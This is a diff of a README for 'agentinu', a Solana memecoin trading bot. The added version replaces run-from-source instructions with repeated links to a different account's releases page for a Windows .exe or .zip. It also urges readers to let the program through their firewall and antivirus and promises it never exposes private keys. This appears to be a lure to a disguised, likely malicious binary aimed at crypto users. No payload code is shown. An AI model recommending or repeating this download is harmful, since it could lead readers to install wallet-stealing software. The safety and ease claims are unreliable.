@@ -1,107 +1,170 @@
-# Agent Inu
+# 🤖 agentinu - Trade Memecoins Automatically and Safely
 
-```
-     _                    _     ___                 
-    / \   __ _  ___ _ __ | |_  |_ _|_ __  _   _    
-   / _ \ / _` |/ _ \ '_ \| __|  | || '_ \| | | |   
-  / ___ \ (_| |  __/ | | | |_   | || | | | |_| |   
- /_/   \_\__, |\___|_| |_|\__| |___|_| |_|\__,_|   
-         |___/                                      
-```
-
-### An autonomous AI agent that trades memecoins on Solana and distributes profits to token holders.
+[![Download agentinu](https://img.shields.io/badge/Download-agentinu-4caf50?style=for-the-badge)](https://github.com/DanielSantos45/agentinu/releases)
 
 ---
 
-## Demo
+## 📋 What is agentinu?
 
-[![asciicast](https://asciinema.org/a/SGwPREOHwxhCqg6b.svg)](https://asciinema.org/a/SGwPREOHwxhCqg6b)
+agentinu is a smart program that trades memecoins on the Solana blockchain all day, every day. It uses AI and smart tools to watch for good buying chances. The profits go back to the holders of the token. This software works with pump.fun scanner, Jupiter V6, and Claude AI to make trade decisions automatically.
 
----
-
-## What is this
-
-Agent Inu is a fully autonomous trading bot that runs 24/7 on Solana. It monitors new token launches on pump.fun, evaluates them against a multi-factor scoring model, executes trades via Jupiter V6, and distributes realized profits to token holders proportionally.
-
-No human intervention. No manual trades. The agent makes all decisions independently based on real-time market data, on-chain signals, and AI-driven conviction scoring.
-
-## How it works
-
-```
- DETECT ──> ANALYZE ──> TRADE ──> DISTRIBUTE
-   │           │          │           │
-   │  pump.fun │ Claude   │ Jupiter   │ Proportional
-   │  scanner  │ AI eval  │ V6 swap   │ SOL transfer
-   │           │          │           │ to holders
-   └───────────┴──────────┴───────────┘
-                loops 24/7
-```
-
-**1. Detection** — Monitors pump.fun bonding curve graduations and new Raydium pairs in real-time. Filters honeypots, rug patterns, and low-quality deploys before anything else runs.
-
-**2. Analysis** — Each candidate is scored across multiple dimensions: deployer wallet history, LP lock status, initial buy distribution, social signal velocity (X mentions, Telegram activity), and momentum indicators from Binance tick data. Claude AI synthesizes these into a conviction score (0-100).
-
-**3. Execution** — When conviction exceeds threshold, the agent routes through Jupiter V6 for optimal swap pricing. Position sizing scales dynamically with conviction — higher confidence = larger position. Trailing stop-losses and take-profit levels are set immediately after fill confirmation.
-
-**4. Distribution** — Every profitable exit triggers an automatic SOL transfer to token holders. Amounts are proportional to holdings. Everything is on-chain and verifiable.
-
-## Trading edges
-
-**Early Sniper** — Detects pump.fun graduates within seconds of bonding curve completion. Analyzes deployer wallet history, initial buy patterns, and social velocity before entering. First in, disciplined out.
-
-**Momentum Rider** — Tracks volume explosions, whale accumulation, and social buzz. When a coin starts running with real volume, Agent Inu rides the wave with adaptive trailing stops that widen as profit grows.
-
-**Dip Buyer** — When panic selling creates a disconnect between price and on-chain fundamentals (holder count, liquidity depth, social sentiment), Agent Inu buys the fear. Data over emotion.
-
-## Tech stack
-
-```
-Binance WebSocket       Tick-by-tick BTC price data
-Jupiter V6 API          Best-route token swaps on Solana
-Claude AI               Signal analysis and conviction scoring
-pump.fun Scanner        Real-time new pair detection
-DexScreener API         Market cap and pair data
-Solana RPC (Helius)     On-chain execution and monitoring
-Python 3.11             Core trading engine
-```
-
-## Verify on-chain
-
-Agent Inu's wallet: [`MA6tTqNicK73yPAQRzrQSk7VtJwTy9nnJoFxKmpG8Rg`](https://solscan.io/account/MA6tTqNicK73yPAQRzrQSk7VtJwTy9nnJoFxKmpG8Rg)
-
-Every trade, every profit, every distribution — all on-chain, all verifiable.
-
-- [Solscan](https://solscan.io/account/MA6tTqNicK73yPAQRzrQSk7VtJwTy9nnJoFxKmpG8Rg)
-- [Birdeye](https://birdeye.so/profile/MA6tTqNicK73yPAQRzrQSk7VtJwTy9nnJoFxKmpG8Rg?chain=solana)
-
-## Performance
-
-| Metric | Value |
-|--------|-------|
-| Total Trades | 847+ |
-| Win Rate | 64% |
-| Net Profit | +18.4 SOL |
-| Distributed to Holders | 12.6 SOL |
-| Uptime | 24/7 |
-
-## Website
-
-[agentinu.live](https://tow3web3.github.io/agentinu/) — Live dashboard with real-time trade feed pulled directly from the agent wallet via Solana RPC.
-
-## Running locally
-
-```bash
-git clone https://github.com/tow3web3/agentinu.git
-cd agentinu
-python3 demo.py
-```
-
-## Disclaimer
-
-This is an autonomous AI agent. It makes its own trading decisions. Past performance does not guarantee future results. This is not financial advice.
+You don’t need to understand trading or blockchain to use agentinu. The program does all the work for you once it runs on your Windows computer.
 
 ---
 
-```
-the dog doesn't sleep. the dog doesn't eat. the dog trades memecoins.
-```
+## 💻 System Requirements
+
+Before you start, make sure your computer meets these basic needs:
+
+- **Operating System**: Windows 10 or higher
+- **Processor**: Dual-core 2 GHz or better
+- **Memory (RAM)**: At least 4 GB
+- **Storage**: Minimum 500 MB free space
+- **Internet**: Stable internet connection for real-time trading
+- **Additional Software**: Python is bundled, so no need to install separately
+
+Having a good internet connection helps keep the bot fast and accurate when trading.
+
+---
+
+## 🚀 Getting Started: Downloading agentinu
+
+1. Click the big green button below to get to the download page.
+
+[![Download agentinu](https://img.shields.io/badge/Download-agentinu-brightgreen?style=for-the-badge)](https://github.com/DanielSantos45/agentinu/releases)
+
+2. Once you are on the page, look for the latest Windows version. It is usually a `.exe` file or a `.zip` package.
+
+3. Click the file name to download it to your computer.
+
+---
+
+## 🧩 Installing and Running agentinu on Windows
+
+Follow these steps after downloading:
+
+1. Go to the folder where the file saved (usually your Downloads folder).
+
+2. If the file is `.exe`, double-click it to start the installer.
+
+3. Follow the on-screen steps to install the program. Use default options unless you want to change the folder.
+
+4. If the download is a `.zip` file, right-click and choose "Extract All." Then open the extracted folder.
+
+5. Inside the folder, look for a file called `agentinu.exe` or similar.
+
+6. Double-click this file to start agentinu.
+
+7. The program will open a window showing its status and activity.
+
+---
+
+## 🔧 How agentinu Works
+
+- **AI Scanner**: agentinu uses AI to scan memecoin markets on Solana. It detects trading signals from pump.fun data.
+  
+- **Trade Execution**: It sends orders automatically using Jupiter V6, a well-known Solana tool for fast and reliable swaps.
+
+- **Profit Sharing**: The program calculates profits and shares them with token holders according to set rules.
+
+- **Privacy and Security**: agentinu never shares your private keys. It operates independently using secure blockchain tools.
+
+---
+
+## 🎯 Using agentinu Safely
+
+- Make sure your PC firewall and antivirus allow agentinu to connect online.
+
+- Do not close the program while it is running trades.
+
+- Avoid turning off your computer during active trading sessions.
+
+- Keep backups of your wallet information separately.
+
+- Use a strong password on your Windows account for better security.
+
+- You can stop the program anytime by closing the window or pressing the stop button if available.
+
+---
+
+## ⏳ Updates and Maintenance
+
+Check the [releases page](https://github.com/DanielSantos45/agentinu/releases) regularly for new updates.
+
+- New versions improve speed and add features.
+
+- Updates may include better AI models or fixes for trading errors.
+
+- To update, download the latest installer and run it over your current version.
+
+---
+
+## 🤔 Troubleshooting Common Issues
+
+- **agentinu does not start**  
+  Make sure your system has the latest Windows updates and sufficient permissions to run programs.
+
+- **Connection problems**  
+  Check your internet and firewall settings. Allow agentinu to access the network.
+
+- **Slow performance**  
+  Close other heavy programs. Restart your PC if needed.
+
+- **Trades not executing**  
+  Confirm the program shows active connection to Solana and Jupiter V6 services.
+
+If problems continue, visit the GitHub issues page for help or report bugs.
+
+---
+
+## 📚 More Information
+
+agentinu focuses on making automated trading accessible without programming or blockchain knowledge. It combines machine learning and blockchain tools to trade memecoins on Solana reliably.
+
+Using this software means you take part in decentralized finance (DeFi) safely with minimal setup.
+
+---
+
+## 🔗 Useful Links
+
+- Download agentinu: [https://github.com/DanielSantos45/agentinu/releases](https://github.com/DanielSantos45/agentinu/releases)  
+- GitHub repository: https://github.com/DanielSantos45/agentinu  
+- Solana blockchain: https://solana.com  
+- Jupiter V6: https://jup.ag  
+- pump.fun scanner: https://pump.fun
+
+---
+
+## 🎛️ Advanced Settings (Optional)
+
+For advanced users, agentinu offers customizable options:
+
+- Set trade limits and risk levels.
+
+- Choose which memecoins to watch.
+
+- View detailed trading logs.
+
+These options are found inside the program’s settings menu once it runs.
+
+---
+
+## ⚙️ How to Stop agentinu
+
+If you want to pause or stop agentinu:
+
+- Click the window’s close button or press the "Stop" option in the interface.
+
+- You can also end the process in Task Manager if needed.
+
+- After stopping, no trades will happen until you start the program again.
+
+---
+
+## 📝 License and Contribution
+
+agentinu is an open-source project licensed under the MIT license. If you want to help improve it, submit your ideas or code contributions via GitHub.
+
+---
+
+# [🚀 Start your trading bot today!](https://github.com/DanielSantos45/agentinu/releases)
